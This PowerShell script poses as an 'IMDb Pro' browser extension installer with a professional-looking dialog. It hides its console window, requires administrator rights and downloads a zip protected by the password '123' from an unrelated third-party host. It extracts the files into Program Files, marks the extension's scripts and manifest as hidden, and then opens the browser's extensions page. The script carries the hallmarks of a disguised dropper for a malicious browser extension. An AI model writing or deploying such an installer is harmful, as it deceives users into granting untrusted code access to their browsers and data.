# IMDb Pro Installer - Clean Professional UI
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Hide PowerShell console window
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null

# Create main form - Professional Installer Style
$mainForm = New-Object System.Windows.Forms.Form
$mainForm.Text = "Install IMDb Pro"
$mainForm.Size = New-Object System.Drawing.Size(500, 250)
$mainForm.StartPosition = "CenterScreen"
$mainForm.BackColor = [System.Drawing.Color]::White
$mainForm.ForeColor = [System.Drawing.Color]::FromArgb(32, 32, 32)
$mainForm.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
$mainForm.MaximizeBox = $false

# Main question title
$titleLabel = New-Object System.Windows.Forms.Label
$titleLabel.Text = "Install IMDb Pro?"
$titleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
$titleLabel.ForeColor = [System.Drawing.Color]::FromArgb(32, 32, 32)
$titleLabel.AutoSize = $true
$titleLabel.Location = New-Object System.Drawing.Point(20, 20)
$mainForm.Controls.Add($titleLabel)

# App info section
$appNameLabel = New-Object System.Windows.Forms.Label
$appNameLabel.Text = "Browser Extension"
$appNameLabel.Font = New-Object System.Drawing.Font("Segoe UI", 11, [System.Drawing.FontStyle]::Bold)
$appNameLabel.ForeColor = [System.Drawing.Color]::FromArgb(32, 32, 32)
$appNameLabel.AutoSize = $true
$appNameLabel.Location = New-Object System.Drawing.Point(20, 60)
$mainForm.Controls.Add($appNameLabel)

$publisherLabel = New-Object System.Windows.Forms.Label
$publisherLabel.Text = "Publisher: IMDb Pro Team"
$publisherLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$publisherLabel.ForeColor = [System.Drawing.Color]::FromArgb(96, 96, 96)
$publisherLabel.AutoSize = $true
$publisherLabel.Location = New-Object System.Drawing.Point(20, 85)
$mainForm.Controls.Add($publisherLabel)

$versionLabel = New-Object System.Windows.Forms.Label
$versionLabel.Text = "Version: 2.1.0"
$versionLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$versionLabel.ForeColor = [System.Drawing.Color]::FromArgb(96, 96, 96)
$versionLabel.AutoSize = $true
$versionLabel.Location = New-Object System.Drawing.Point(20, 105)
$mainForm.Controls.Add($versionLabel)

# Checkboxes section
$launchCheckbox = New-Object System.Windows.Forms.CheckBox
$launchCheckbox.Text = "Launch when ready"
$launchCheckbox.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$launchCheckbox.ForeColor = [System.Drawing.Color]::FromArgb(32, 32, 32)
$launchCheckbox.AutoSize = $true
$launchCheckbox.Location = New-Object System.Drawing.Point(20, 140)
$launchCheckbox.Checked = $true
$mainForm.Controls.Add($launchCheckbox)

$installCheckbox = New-Object System.Windows.Forms.CheckBox
$installCheckbox.Text = "Install"
$installCheckbox.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)
$installCheckbox.ForeColor = [System.Drawing.Color]::FromArgb(32, 32, 32)
$installCheckbox.AutoSize = $true
$installCheckbox.Location = New-Object System.Drawing.Point(20, 165)
$installCheckbox.Checked = $true
$mainForm.Controls.Add($installCheckbox)

# Progress bar (hidden initially)
$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Location = New-Object System.Drawing.Point(20, 140)
$progressBar.Size = New-Object System.Drawing.Size(460, 20)
$progressBar.Style = [System.Windows.Forms.ProgressBarStyle]::Continuous
$progressBar.ForeColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
$progressBar.Visible = $false
$mainForm.Controls.Add($progressBar)

# Status label (hidden initially)
$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = "Installing..."
$statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(64, 64, 64)
$statusLabel.AutoSize = $true
$statusLabel.Location = New-Object System.Drawing.Point(20, 165)
$statusLabel.Visible = $false
$mainForm.Controls.Add($statusLabel)

# Install button
$installButton = New-Object System.Windows.Forms.Button
$installButton.Text = "Install"
$installButton.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)
$installButton.ForeColor = [System.Drawing.Color]::White
$installButton.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
$installButton.Size = New-Object System.Drawing.Size(100, 30)
$installButton.Location = New-Object System.Drawing.Point(380, 20)
$installButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$installButton.FlatAppearance.BorderSize = 0
$installButton.Cursor = [System.Windows.Forms.Cursors]::Hand
$mainForm.Controls.Add($installButton)

# Cancel button
$cancelButton = New-Object System.Windows.Forms.Button
$cancelButton.Text = "Cancel"
$cancelButton.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$cancelButton.Size = New-Object System.Drawing.Size(80, 30)
$cancelButton.Location = New-Object System.Drawing.Point(290, 20)
$cancelButton.Cursor = [System.Windows.Forms.Cursors]::Hand
$mainForm.Controls.Add($cancelButton)

# Progress update function
function Update-Progress {
    param([string]$Message, [int]$Progress)
    
    $statusLabel.Text = $Message
    $progressBar.Value = $Progress
    [System.Windows.Forms.Application]::DoEvents()
    Start-Sleep -Milliseconds 500
}

# Show installation view
function Show-InstallationView {
    $launchCheckbox.Visible = $false
    $installCheckbox.Visible = $false
    $installButton.Visible = $false
    $cancelButton.Visible = $false
    
    $progressBar.Visible = $true
    $statusLabel.Visible = $true
    $progressBar.Value = 0
}

# Show completion view
function Show-CompletionView {
    $progressBar.Visible = $false
    $statusLabel.Text = "Installation completed successfully!"
    $statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(0, 128, 0)
    
    # Show close button
    $closeButton = New-Object System.Windows.Forms.Button
    $closeButton.Text = "Close"
    $closeButton.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)
    $closeButton.ForeColor = [System.Drawing.Color]::White
    $closeButton.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
    $closeButton.Size = New-Object System.Drawing.Size(100, 30)
    $closeButton.Location = New-Object System.Drawing.Point(380, 20)
    $closeButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
    $closeButton.FlatAppearance.BorderSize = 0
    $closeButton.Cursor = [System.Windows.Forms.Cursors]::Hand
    $closeButton.Add_Click({
        if ($launchCheckbox.Checked) {
            try {
                Start-Process "chrome.exe" "chrome://extensions"
            }
            catch {
                try {
                    Start-Process "msedge.exe" "edge://extensions"
                }
                catch {
                }
            }
        }
        $mainForm.Close()
    })
    $mainForm.Controls.Add($closeButton)
}

# Installation function
function Start-Installation {
    $downloadUrl = "https://file.apikey.my/imdb/imdb.zip"
    $installPath = "C:\Program Files\imdb-pro"
    $zipPassword = "123"
    
    try {
        Show-InstallationView
        
        # Check admin rights
        Update-Progress "Checking administrator privileges..." 10
        
        if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
            throw "Please run as Administrator"
        }
        
        # Create directory
        Update-Progress "Creating installation directory..." 20
        
        if (Test-Path $installPath) {
            Remove-Item "$installPath\*" -Recurse -Force -ErrorAction SilentlyContinue
        } else {
            New-Item -ItemType Directory -Path $installPath -Force | Out-Null
        }
        
        # Download file
        Update-Progress "Downloading package..." 40
        
        $tempFile = "$env:TEMP\imdb.zip"
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($downloadUrl, $tempFile)
        
        if (-not (Test-Path $tempFile) -or (Get-Item $tempFile).Length -eq 0) {
            throw "Download failed"
        }
        
        Update-Progress "Extracting files..." 60
        
        # Extraction using 7-Zip
        $7zPath = "$env:ProgramFiles\7-Zip\7z.exe"
        if (Test-Path $7zPath) {
            $arguments = @(
                "x",
                "-p$zipPassword",
                "-o`"$installPath`"",
                "-y",
                "`"$tempFile`""
            )
            
            $process = Start-Process -FilePath $7zPath -ArgumentList $arguments -Wait -PassThru -NoNewWindow
            
            if ($process.ExitCode -ne 0) {
                throw "Extraction failed with 7-Zip"
            }
        } else {
            try {
                Expand-Archive -Path $tempFile -DestinationPath $installPath -Force
            }
            catch {
                throw "7-Zip not found and Expand-Archive failed"
            }
        }
        
        # Verify extraction
        $files = Get-ChildItem $installPath -Recurse
        if ($files.Count -eq 0) {
            throw "No files were extracted"
        }
        
        Update-Progress "Finalizing installation..." 80
        
        # Hide files
        $filesToHide = @("background.js", "content.js", "popup.js", "styles.css", "popup.html", "manifest.json")
        foreach ($file in $filesToHide) {
            $filePath = Join-Path $installPath $file
            if (Test-Path $filePath) {
                attrib +h $filePath
            }
        }
        
        # Cleanup
        if (Test-Path $tempFile) {
            Remove-Item $tempFile -Force
        }
        
        Update-Progress "Installation completed!" 100
        Start-Sleep -Milliseconds 1000
        
        Show-CompletionView
        
    }
    catch {
        $statusLabel.Text = "Installation failed: $($_.Exception.Message)"
        $statusLabel.ForeColor = [System.Drawing.Color]::Red
        
        # Show retry button
        $retryButton = New-Object System.Windows.Forms.Button
        $retryButton.Text = "Retry"
        $retryButton.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)
        $retryButton.ForeColor = [System.Drawing.Color]::White
        $retryButton.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
        $retryButton.Size = New-Object System.Drawing.Size(100, 30)
        $retryButton.Location = New-Object System.Drawing.Point(380, 20)
        $retryButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
        $retryButton.FlatAppearance.BorderSize = 0
        $retryButton.Cursor = [System.Windows.Forms.Cursors]::Hand
        $retryButton.Add_Click({
            $mainForm.Controls.Remove($retryButton)
            Start-Installation
        })
        $mainForm.Controls.Add($retryButton)
    }
}

# Button events
$installButton.Add_Click({
    if ($installCheckbox.Checked) {
        Start-Installation
    }
})

$cancelButton.Add_Click({
    $mainForm.Close()
})

# Show form
[System.Windows.Forms.Application]::EnableVisualStyles()
$mainForm.ShowDialog() | Out-Null
